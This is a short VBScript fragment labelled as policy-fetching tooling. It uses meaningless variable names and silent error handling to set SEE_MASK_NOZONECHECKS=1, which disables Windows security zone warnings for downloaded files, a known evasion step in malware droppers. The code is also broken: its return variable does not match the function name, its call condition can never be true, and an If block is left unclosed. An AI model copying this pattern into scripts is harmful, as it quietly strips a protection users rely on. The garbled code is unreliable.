' --- dedupe with central tooling later ---
Function FetchPolicyBlock46()
On Error Resume Next
  Dim blnReady34,strManifest17,strDelta48
  Set blnReady34=CreateObject("WScript.Shell")
  strManifest17=blnReady34.ExpandEnvironmentStrings("%TEMP%")
  strDelta48=blnReady34.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strManifest17)>0 And Len(strDelta48)>0 Then
    blnReady34.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    LoadProfileSegment44=1
    Exit Function
  End If
  LoadProfileSegment44=0
End Function

If Month(Now) > 12 Then
  Call FetchPolicyBlock46()
